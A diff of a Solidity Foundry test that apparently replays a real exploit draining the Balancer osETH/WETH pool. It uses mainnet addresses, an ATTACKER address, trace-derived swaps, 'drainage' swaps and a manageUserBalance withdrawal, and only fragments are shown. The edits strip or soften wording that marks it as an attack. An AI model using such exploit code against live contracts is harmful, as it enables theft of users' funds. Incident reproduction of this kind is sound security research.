@@ -48,7 +48,6 @@ interface IBalancerVault {
         );
 
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
-
     function getInternalBalance(address user, IERC20[] memory tokens)
         external view
         returns (uint256[] memory balances);
@@ -69,13 +68,10 @@ interface IWETH is IERC20 {
 
 contract BalancerOsEthWethPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-
-    // Pool 2: osETH/WETH (Ethereum)
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     bytes32 constant POOL_ID_OSETH = 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635;
     address constant osETH_WETH_BPT = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
     address constant osETH = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -116,7 +112,7 @@ contract BalancerOsEthWethPoolTest is Test {
             toInternalBalance: true
         });
 
-        // Exact swaps from transaction trace
+        // swaps from transaction trace
         ExactSwapData[90] memory swaps;
         swaps[0] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: osETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 2, indexOut: 0 });
         swaps[1] = ExactSwapData({ tokenIn: osETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 2, indexOut: 1 });
@@ -210,7 +206,6 @@ contract BalancerOsEthWethPoolTest is Test {
         swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: osETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 0, indexOut: 1 });
 
         console.log("Total swaps:", swaps.length);
-        console.log("All swaps use kind=GIVEN_OUT (specify output, pay variable input)");
 
         uint256 successCount = 0;
 
@@ -303,11 +298,9 @@ contract BalancerOsEthWethPoolTest is Test {
             if (additionalSwaps > 100) break;
         }
 
-        console.log("Additional drainage swaps:", additionalSwaps);
+        console.log("Additional swaps:", additionalSwaps);
 
         // WITHDRAWAL VIA manageUserBalance()
-        console.log("=== WITHDRAWAL manageUserBalance() ===");
-
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(address(WETH));
         internalTokens[1] = IERC20(osETH_WETH_BPT);
@@ -413,7 +406,7 @@ contract BalancerOsEthWethPoolTest is Test {
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("osETH:", IERC20(osETH).balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount + additionalSwaps);
+        console.log("Total swaps:", successCount + additionalSwaps);
         console.log("SUCCESS!");
     }
     
